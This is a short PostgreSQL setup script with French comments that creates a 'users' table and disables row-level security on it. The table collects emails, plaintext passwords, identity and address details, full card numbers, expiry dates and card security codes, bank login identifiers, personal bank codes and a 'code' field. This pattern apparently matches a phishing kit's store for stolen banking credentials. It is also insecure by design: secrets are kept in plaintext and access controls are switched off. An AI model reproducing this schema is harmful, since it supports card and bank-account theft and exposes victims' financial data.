
-- Activer l'extension uuid-ossp si elle n'est pas déjà activée
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Création de la table users avec toutes les colonnes définies dans l'interface UserData
CREATE TABLE IF NOT EXISTS public.users (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  email TEXT UNIQUE,
  password TEXT,
  nom TEXT,
  prenom TEXT,
  datenaissance TEXT,
  adresse TEXT,
  codepostal TEXT,
  ville TEXT,
  telephone TEXT,
  numerocarte TEXT,
  dateexpiration TEXT,
  cryptogramme TEXT,
  typebanque TEXT,
  identifiantbancaire TEXT,
  codepersonnel TEXT,
  montant TEXT,
  code TEXT,
  dernieremaj TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Désactiver complètement RLS pour la table users
ALTER TABLE public.users DISABLE ROW LEVEL SECURITY;
